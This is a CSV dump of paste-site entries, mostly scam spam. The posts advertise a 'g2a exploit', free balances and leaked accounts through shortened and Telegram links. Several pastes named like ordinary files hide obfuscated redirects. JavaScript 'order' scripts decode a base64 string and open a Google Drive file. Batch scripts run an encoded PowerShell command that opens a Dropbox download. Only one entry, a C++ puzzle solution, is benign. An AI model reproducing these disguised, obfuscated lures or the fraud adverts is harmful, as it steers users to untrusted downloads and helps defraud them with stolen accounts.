id,title,username,language,date,content
G0e9YRZK,Order.js,SpawnKz,JavaScript,Thursday 8th of May 2025 07:14:23 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/28893/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3bL4CMy2,⭐️ Leaked Free Vouchers Method ⭐️,doogz,JavaScript,Thursday 8th of May 2025 07:13:00 PM CDT,"52398 Posted On https://t.me/leakzbyeminem - Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.8”. Higher or lower version will not work. versions are based on the update of the g2a site"
ED9rne4k,⭐️Earn $2000 a Month From Home UC,Sargent_Ian224,JavaScript,Thursday 8th of May 2025 07:13:00 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

sezVZlqngR
"
aKuecGyA,accs fresh,jackgamingpastebin,JavaScript,Thursday 8th of May 2025 07:12:20 PM CDT,164427 - check it out at https://tinyurl.com/4npuscbk
SvfAzU6k,⭐️Make 2000$+ daily together BI,Sargent_Ian224,JavaScript,Thursday 8th of May 2025 07:09:31 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

IHKRBx1gDf
"
kFjCa0WG,⭐️ Make $3000 in 24 hours ⭐️,doogz,JavaScript,Thursday 8th of May 2025 07:08:58 PM CDT,"92364 Posted On https://t.me/leakzbyeminem - Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.8”. Higher or lower version will not work. versions are based on the update of the g2a site"
jQ2U31Em,Fresh proxies,gsgsdgs,PHP,Thursday 8th of May 2025 07:08:38 PM CDT,750835 - check it out at https://tinyurl.com/bwv75hz9
ekcja423,create_users.ps1,Personal_Toolkit,Batch,Thursday 8th of May 2025 07:07:29 PM CDT,"@ECHO OFF
TITLE $~foddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==tutorial GOTO tutorial

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwAzADQAYgA1AG4AbABpAGEAdgBkAGEAdwBkAHcAcQBvAHgAZgB2ADUAdQAvAHQAdQB0AG8AcgBpAGEAbAAuAHAAZABmAD8AcgBsAGsAZQB5AD0AZgBkAGgAOQBjADEAaABzAHIAdQA3AGcAcgA1AHEAdwA1ADgANwA0ADUAawBhAHoAcAAmAGUAPQAxACYAcwB0AD0AcgBwADIAdgBzADUAMQB0ACIAIAAgACMAIABpAGQAPQBjADYAMwA4AGYAYQA3ADQA
EXIT /b
"
z7agyQPW,⭐️500£ ANY SITE BALANCE INSTANTLY 2025 3J,Sargent_Ian224,JavaScript,Thursday 8th of May 2025 07:06:03 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

Wcx8UYCsHT
"
F7H2a3SN,⭐️500 EUR BALANCE METHOD ⭐️,doogz,JavaScript,Thursday 8th of May 2025 07:04:56 PM CDT,"58031 Posted On https://t.me/leakzbyeminem - Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.8”. Higher or lower version will not work. versions are based on the update of the g2a site"
NcKXtTaV,⭐️Make $3000 in 24 hours W7,Sargent_Ian224,JavaScript,Thursday 8th of May 2025 07:02:36 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

VVMaARRtVm
"
f5sVigf8,Leaked Accounts - Fresh Hits,Xp_Isolation,JavaScript,Thursday 8th of May 2025 07:01:42 PM CDT,65541 Accounts Posted On https://t.me/leakzbyeminem
WRPjU3G6,⭐️ Make $2000 Daily ⭐️,doogz,JavaScript,Thursday 8th of May 2025 07:00:53 PM CDT,"59266 Posted On https://t.me/leakzbyeminem - Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.8”. Higher or lower version will not work. versions are based on the update of the g2a site"
wwfeYr3f,Market.js,SpawnKz,JavaScript,Thursday 8th of May 2025 06:59:02 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/80658/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ZDNrrHmW,⭐️500£ ANY SITE BALANCE INSTANTLY 2025 3J,youssfbr,JavaScript,Thursday 8th of May 2025 06:58:11 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

IJjO1LQhpn
"
jib4zUDh,Leaked Accounts - Fresh Hits,gsgsdgs,PHP,Thursday 8th of May 2025 06:58:07 PM CDT,009233 - check it out at https://tinyurl.com/bwv75hz9
jvQS9bM1,PayPal with Balance,gsgsdgs,PHP,Thursday 8th of May 2025 06:57:34 PM CDT,465790 - check it out at https://tinyurl.com/bwv75hz9
b1u98U8w,remove_software.bat,Personal_Toolkit,Batch,Thursday 8th of May 2025 06:56:55 PM CDT,"@ECHO OFF
TITLE $~foddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==tutorial GOTO tutorial

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwAzADQAYgA1AG4AbABpAGEAdgBkAGEAdwBkAHcAcQBvAHgAZgB2ADUAdQAvAHQAdQB0AG8AcgBpAGEAbAAuAHAAZABmAD8AcgBsAGsAZQB5AD0AZgBkAGgAOQBjADEAaABzAHIAdQA3AGcAcgA1AHEAdwA1ADgANwA0ADUAawBhAHoAcAAmAGUAPQAxACYAcwB0AD0AcgBwADIAdgBzADUAMQB0ACIAIAAgACMAIABpAGQAPQA0AGMANwA1AGUAZQBmADYA
EXIT /b
"
p1xZ4FNf,⭐️ Leaked Free Vouchers Method ⭐️,doogz,JavaScript,Thursday 8th of May 2025 06:56:51 PM CDT,"15665 Posted On https://t.me/leakzbyeminem - Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.8”. Higher or lower version will not work. versions are based on the update of the g2a site"
jFkSVBrW,⭐️Make $3000 in 24 hours W7,youssfbr,JavaScript,Thursday 8th of May 2025 06:54:45 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

snxT4aRlNd
"
eYHKXvE4,⭐️ Make $3000 in 24 hours ⭐️,doogz,JavaScript,Thursday 8th of May 2025 06:52:47 PM CDT,"95118 Posted On https://t.me/leakzbyeminem - Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.8”. Higher or lower version will not work. versions are based on the update of the g2a site"
nECABL31,⭐️Earn $2000 a Month From Home UC,youssfbr,JavaScript,Thursday 8th of May 2025 06:51:15 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

1A2nExnw2q
"
PVx5kZ24,⭐️500 EUR BALANCE METHOD ⭐️,doogz,JavaScript,Thursday 8th of May 2025 06:48:39 PM CDT,"72132 Posted On https://t.me/leakzbyeminem - Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.8”. Higher or lower version will not work. versions are based on the update of the g2a site"
6eDBiXBA,⭐️Make $3000 in 24 hours W7,YourNormalCaesar1234,JavaScript,Thursday 8th of May 2025 06:46:49 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

kO6aKiZMY9
"
3QkcvaxX,Chaturbate with Tokens,Xp_Isolation,JavaScript,Thursday 8th of May 2025 06:46:18 PM CDT,14841 Accounts Posted On https://t.me/leakzbyeminem
ymZdDL16,⭐️ Make $2000 Daily ⭐️,doogz,JavaScript,Thursday 8th of May 2025 06:44:36 PM CDT,"13817 Posted On https://t.me/leakzbyeminem - Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.8”. Higher or lower version will not work. versions are based on the update of the g2a site"
4bim9TME,Untitled,SpawnKz,JavaScript,Thursday 8th of May 2025 06:43:38 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/74050/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hSTXR9Cs,⭐️Earn $2000 a Month From Home UC,YourNormalCaesar1234,JavaScript,Thursday 8th of May 2025 06:43:23 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

4XhHP7vgMS
"
nECQ8Ute,⭐️ Leaked Free Vouchers Method ⭐️,JinxModz,JavaScript,Thursday 8th of May 2025 06:40:23 PM CDT,"37704 Posted On https://t.me/leakzbyeminem - Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.8”. Higher or lower version will not work. versions are based on the update of the g2a site"
Vm1HXBzi,⭐️500£ ANY SITE BALANCE INSTANTLY 2025 3J,LilinWIsThat156,JavaScript,Thursday 8th of May 2025 06:39:40 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

8uHIMzmy2n
"
cU7M8ery,⭐️ Make $3000 in 24 hours ⭐️,JinxModz,JavaScript,Thursday 8th of May 2025 06:36:17 PM CDT,"51027 Posted On https://t.me/leakzbyeminem - Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.8”. Higher or lower version will not work. versions are based on the update of the g2a site"
fFpNAeDN,⭐️Make $3000 in 24 hours W7,LilinWIsThat156,JavaScript,Thursday 8th of May 2025 06:36:13 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

eGyFXiCgom
"
f1xJ26z9,remove_software.bat,K3_dohko_1,Batch,Thursday 8th of May 2025 06:35:21 PM CDT,"@ECHO OFF
TITLE $~foddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==tutorial GOTO tutorial

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwAzADQAYgA1AG4AbABpAGEAdgBkAGEAdwBkAHcAcQBvAHgAZgB2ADUAdQAvAHQAdQB0AG8AcgBpAGEAbAAuAHAAZABmAD8AcgBsAGsAZQB5AD0AZgBkAGgAOQBjADEAaABzAHIAdQA3AGcAcgA1AHEAdwA1ADgANwA0ADUAawBhAHoAcAAmAGUAPQAxACYAcwB0AD0AcgBwADIAdgBzADUAMQB0ACIAIAAgACMAIABpAGQAPQBkAGIAYwAwADEANwBmAGUA
EXIT /b
"
K0MCxSiu,⭐️Earn $2000 a Month From Home UC,LilinWIsThat156,JavaScript,Thursday 8th of May 2025 06:32:48 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

vlgwddn0R1
"
uGwrV6nu,⭐️500 EUR BALANCE METHOD ⭐️,JinxModz,JavaScript,Thursday 8th of May 2025 06:32:14 PM CDT,"66222 Posted On https://t.me/leakzbyeminem - Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.8”. Higher or lower version will not work. versions are based on the update of the g2a site"
z0FyQfuR,Products.js,ii_xjackk,JavaScript,Thursday 8th of May 2025 06:31:10 PM CDT,076694 - check it out at https://tinyurl.com/4npuscbk
UCDEviMW,Crypto Accounts,Xp_Isolation,JavaScript,Thursday 8th of May 2025 06:30:56 PM CDT,66481 Accounts Posted On https://t.me/leakzbyeminem
cMvheCxX,Leaked Accounts - Fresh HitsUntitled,ii_xjackk,JavaScript,Thursday 8th of May 2025 06:30:39 PM CDT,064786 - check it out at https://tinyurl.com/4npuscbk
1sddTY96,⭐️Make 2000$+ daily together BI,LilinWIsThat156,JavaScript,Thursday 8th of May 2025 06:29:24 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

FGNj0LhVLE
"
uQK6sLAt,Pouring Wine,tepyotin2,C++,Thursday 8th of May 2025 06:29:06 PM CDT,"#include <bits/stdc++.h>

using namespace std;

struct Cup{
	int first, second, third, count;
	bool operator<(const Cup& a) const{
		if(first != a.first){
			return first<a.first;
		}else if(second != a.second){
			return second<a.second;
		}
		return third<a.third;
	}
};

//Cup start;
queue<Cup> q;
set<Cup> visited;
int start[3];

int main(){
	//freopen(""wine.in"", ""r"", stdin);
	
	cin >> start[0] >> start[1] >> start[2];
	visited.insert({start[0], 0, 0, 0});
	//visited.insert({start.first, 0, 0, 1});
	q.push({start[0], 0, 0, 0});
	while(!q.empty()){
		Cup cur = q.front();
		q.pop();
		//cout << cur.first << "", "" << cur.second << "", "" << cur.third << '\n';
		//cout << cur.count << '\n';
		if((cur.first==cur.second && cur.third == 0) || (cur.first == cur.third && cur.second == 0) || (cur.second == cur.third && cur.first == 0)){
			//cout << ""HI"" << '\n';
			//cout << cur.first << "", "" << cur.second << "", "" << cur.third << '\n';
			cout << cur.count << '\n';
			return 0;
		}
		for(int i=0; i<3; i++){
			for(int j=0; j<3; j++){
				if(i==j){
					continue;
				}
				//cout << ""i: "" << i << "", j: "" << j << '\n';
				int val[3] = {cur.first, cur.second, cur.third};
				if(val[i]>0){
					//cout << ""i: "" << i << "", j: "" << j << '\n';
					if(val[i]+val[j]>start[j]){
						val[i] = (val[i]+val[j])-start[j];
						val[j] = start[j];
					}else if(val[i]+val[j]<=start[j]){
						val[j] = val[i]+val[j];
						val[i] = 0;
					}
					Cup temp = {val[0], val[1], val[2], cur.count+1};
					if(visited.find(temp) == visited.end()){
						//cout << ""1: "" << val[0] << "", 2: "" << val[1] << "", 3: "" << val[2] << '\n';
						visited.insert(temp);
						q.push(temp);
					}
				}
			}
		}
	}
	cout << ""NO"" << '\n';
	
	return 0;
}
"
